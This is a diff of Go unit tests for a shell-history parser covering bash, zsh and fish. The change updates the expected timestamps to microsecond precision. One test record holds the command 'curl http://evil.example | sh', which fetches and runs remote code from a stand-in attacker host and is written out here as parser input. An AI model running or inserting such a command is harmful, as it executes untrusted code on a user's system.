@@ -38,7 +38,7 @@ func TestBashPlainAndStamped(t *testing.T) {
 		t.Fatalf("plain: %v", recs[0])
 	}
 	if recs[1]["Command"] != "curl http://evil.example | sh" ||
-		recs[1]["EventTime"] != "2026-01-01T00:00:00Z" || recs[1]["TimeKind"] != "command" {
+		recs[1]["EventTime"] != "2026-01-01T00:00:00.000000Z" || recs[1]["TimeKind"] != "command" {
 		t.Fatalf("stamped: %v", recs[1])
 	}
 	if recs[2]["EventTime"] != nil { // the stamp applies to ONE command only
@@ -58,7 +58,7 @@ func TestZshExtendedAndMetafied(t *testing.T) {
 	if len(recs) != 2 {
 		t.Fatalf("count %d: %v", len(recs), recs)
 	}
-	if recs[0]["Command"] != "echo é" || recs[0]["EventTime"] != "2026-01-01T00:00:00Z" ||
+	if recs[0]["Command"] != "echo é" || recs[0]["EventTime"] != "2026-01-01T00:00:00.000000Z" ||
 		recs[0]["Elapsed"] != float64(5) {
 		t.Fatalf("extended: %v", recs[0])
 	}
@@ -72,7 +72,7 @@ func TestFish(t *testing.T) {
 		"- cmd: rm -rf /tmp/x\n  when: 1767225700\n  paths:\n    - /tmp/x\n"
 	recs := parse(t, "fish", content)
 	if len(recs) != 2 || recs[0]["Command"] != "git push origin main" ||
-		recs[0]["EventTime"] != "2026-01-01T00:00:00Z" ||
+		recs[0]["EventTime"] != "2026-01-01T00:00:00.000000Z" ||
 		recs[1]["Command"] != "rm -rf /tmp/x" {
 		t.Fatalf("fish: %v", recs)
 	}
